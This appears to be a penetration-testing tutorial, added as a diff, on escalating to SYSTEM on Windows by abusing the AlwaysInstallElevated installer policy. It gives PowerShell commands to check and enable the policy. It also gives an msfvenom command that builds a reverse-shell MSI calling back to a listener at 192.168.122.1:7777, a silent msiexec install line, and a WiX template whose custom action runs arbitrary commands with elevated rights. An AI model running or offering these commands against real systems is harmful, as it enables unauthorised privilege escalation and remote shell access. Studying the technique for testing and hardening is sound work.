@@ -1,0 +1,166 @@
+               _________________________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                Always Install with Elevated Privileges
+
+                            Leonardo Tamiano
+               _________________________________________
+
+
+Table of Contents
+_________________
+
+1. Always Install with Elevated Privileges
+2. Configuration Check
+3. Exploitation
+4. Extra: Create Custom MSI
+5. References
+
+
+1 Always Install with Elevated Privileges
+=========================================
+
+  The "Always Install with Elevated Privileges" option is a policy
+  setting that can allow users to install software with elevated
+  permissions, even if not administrators.
+
+  The problem is that arbitrary code can be executed during the
+  installation of a software.
+
+  Thus, this option represents a significant security risk, as it
+  introduces the ability to execute arbitrary code with higher
+  privileges.
+
+
+2 Configuration Check
+=====================
+
+  To check if the `Always with Elevated Privielges' is enabled, you can
+  either use Group Policy Editor (`gpedit.msc')
+
+  ,----
+  | Computer Configuration -> Administrative Templates
+  |                        -> Windows Components
+  |                        -> Windows Installer
+  |                        -> Always install with elevated privileges
+  `----
+
+  ,----
+  | User Configuration -> Administrative Template
+  |                    -> Windows Components
+  |                    -> Windows Installer
+  `----
+
+  ----------------------------------------------------------------------
+
+  You can also do it from the command line
+
+  ,----
+  | Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
+  `----
+
+  ,----
+  | Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
+  `----
+
+  For the config to work both of these values have to be 1.
+
+  ,----
+  | Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -Value 1
+  | Set-ItemProperty -Path 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -Value 1
+  `----
+
+
+3 Exploitation
+==============
+
+  If the `Always Install with Elevated Privileges' is configured, it is
+  possible to obtain privilege escalation by producing a malicious
+  Microsoft Software Installer package (`msi') and install it.
+
+  - Generate malicious MSI
+    ,----
+    | msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f msi > sample.msi
+    `----
+
+  - Execute it
+    ,----
+    | msiexec /quiet /qn /i sample.msi
+    `----
+
+
+4 Extra: Create Custom MSI
+==========================
+
+  Instead of using `msfvenom', you can use `wixtoolset' to produce an
+  `msi' file that will execute custom code upon execution.
+
+  - Download wix v3.14.1
+    ,----
+    | https://github.com/wixtoolset/wix3/releases/tag/wix3141rtm
+    `----
+
+  - Install the program
+
+  - update PATH
+    ,----
+    | set PATH=%PATH%;"C:\Program Files (x86)\WiX Toolset v3.14\bin"
+    `----
+
+  - Create a sample project
+
+    ,----
+    | <?xml version="1.0"?>
+    | <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+    |   <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
+    | 	   Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
+    |     <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
+    |     <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+    |     <Directory Id="TARGETDIR" Name="SourceDir">
+    |       <Directory Id="ProgramFilesFolder">
+    | 	<Directory Id="INSTALLLOCATION" Name="Example">
+    | 	  <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
+    | 	  </Component>
+    | 	</Directory>
+    |       </Directory>
+    |     </Directory>
+    |     <Feature Id="DefaultFeature" Level="1">
+    |       <ComponentRef Id="ApplicationFiles"/>
+    |     </Feature>
+    |     <Property Id="cmdline">cmd.exe /C whoami /groups > C:\Users\Quickemu\Desktop\test.txt </Property>
+    |     <CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>
+    |     <CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
+    |       fail_here
+    |     </CustomAction>
+    |     <InstallExecuteSequence>
+    |       <Custom Action="Stage1" After="InstallInitialize"></Custom>
+    |       <Custom Action="Stage2" Before="InstallFiles"></Custom>
+    |     </InstallExecuteSequence>
+    |   </Product>
+    | </Wix>
+    `----
+
+  - Create the MSI package
+    ,----
+    | # from wsx into wixobject
+    | candle sample.wxs
+    | 
+    | # from wiboxjet into MSI
+    | light.exe sample.wixobj
+    `----
+
+    - Execute the package
+      ,----
+      | .\sample.msi
+      | msiexec /quiet /qn /i sample.msi
+      `----
+
+
+5 References
+============
+
+  WiX Toolset <https://wixtoolset.org/>
+
+  How do I modify the WIX installer to run as admin (elivated) for my
+  per-machine MSI file?
+  <https://www.add-in-express.com/forum/read.php?FID=5&TID=13992>
